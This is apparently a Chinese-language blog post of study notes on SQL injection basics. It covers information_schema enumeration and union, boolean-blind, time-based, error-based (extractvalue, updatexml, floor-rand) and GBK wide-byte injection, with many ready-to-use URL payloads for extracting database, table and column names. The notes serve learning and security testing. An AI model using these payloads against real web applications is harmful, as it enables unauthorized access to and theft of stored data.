---
title: sql注入基础知识
date: 2021-03-22 17:43:30
tags: [web安全, sql注入]
---

- database() 当前数据库名

- 单行注释`--(空格) ` 在 url 栏中 +会被解释成空格==>`--+`

- order by (n) 对查询结果的第 n 列进行排序,可以用来判断字段个数

- 联合查询(列数必须相等).select \* from users where id ='-1'union select 1,2,3 ----左边查询没结果(没有这个 id),右边结果 1,2,3

- 连接字符串  
   concat 普通拼接  
  concat_ws('\~',1,2) 第一位是连接符  
  group_concat(1\~2)

- information_schema  
  简单的信息数据库  
  里面都是视图,不是表,

  schemata ==>数据库信息  
   schema_name 数据库名称

  tables ==>数据库和表的关系  
   table_name 表名

  columns ==>表和列的关系  
   column_name 列名

length(database())= 数据库名长度

left(database(),1)=' ' 爆破数据库名

- 联合注入

```mysql
select * from admin where id=1 union select 1,2,3,4 form goods;
select * from student where id=1 and exists(select usetname from admin);
```

- 布尔盲注

```mysql
 length(database())=1
```

```mysql
?id=1 and ascii(substr(database(),1,1))>3 –+
```

```mysql
length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>1--+
表名总长度
```

```mysql
ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=1
利用ASCII爆破表名
```

- 时间盲注

```
if(payload,sleep(5),1)
```

- 报错注入

  - xpath 语法错误

    **extractvalue()**

    语法：extractvalue(目标 xml 文档，Xpath_string)

    利用第二个参数不满足格式时会报错,返回我们写入的非法格式内容,

    `?id='and(select extractvalue("1",concat('~',(select语句))))`

    **updatexml()**

    语法:updatexml(目标 xml 文档,xpath_string,new_value)

    作用:用来改变文档中符合条件的节点的值

    利用方式和 extractvalue 类似

    `?id='and(select updatexml("1",concat('~',(select语句)),"1"))`

  - concat+rand()+group_by()导致主键重复

    ```
    concat： 连接字符串功能
    floor： 取**float**的整数值(向下取整）
    rand： 取0~1之间的随机浮点值
    group by： 根据一个或多个列对结果集进行分组并有排序功能
    floor(rand(0)*2)： 随机产生0或1
    ```

`?id='union select 1 from (select count(*),concat((select database())," ",floor(rand(0)*2))x from information_schema.tables group by x)a`

- 宽字节注入

  在提交`?id=1'`时,发现运行的 SQL 语句为`select * from user where  id ='1\' #'`,对单引号进行了转义

  宽字节注入就是利用 mysql 在使用 GBK 编码的时候,会认为两个字符是一个汉字(前一个字符的 ASCII 需要大于 128).

  所以我们提交`id=1%df' #`,运行的 SQL 语句就变为了`select * from user where id ='1運'#'`

  这是因为将%df 和%5c 解码成了一个汉字"运"(`\`的编码为 5c)，从而失去了转义的作用，就可以进行联合注入了
